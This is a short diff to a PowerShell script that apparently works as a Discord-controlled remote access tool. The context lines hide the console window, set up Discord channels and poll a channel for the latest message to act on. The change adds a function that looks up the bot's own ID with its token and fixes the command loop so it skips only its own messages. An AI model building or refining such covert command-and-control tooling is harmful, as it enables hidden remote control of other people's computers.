@@ -1470,7 +1470,17 @@ sendMsg -Embed $jsonPayload
 If ($hideconsole -eq 1){ 
     HideWindow
 }
-
+Function Get-BotUserId {
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
+    $botInfo = $botInfo | ConvertFrom-Json
+    return $botInfo.id
+}
+$global:botId = Get-BotUserId
 # Create category and new channels
 NewChannelCategory
 sleep 1
@@ -1567,7 +1577,7 @@ while ($true) {
     $wc.Headers.Add("Authorization", $headers.Authorization)
     $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
     $most_recent_message = ($messages | ConvertFrom-Json)[0]
-    if (-not $most_recent_message.author.bot) {
+    if ($most_recent_message.author.id -ne $botId) {
         $latestMessageId = $most_recent_message.timestamp
         $messages = $most_recent_message.content
     }
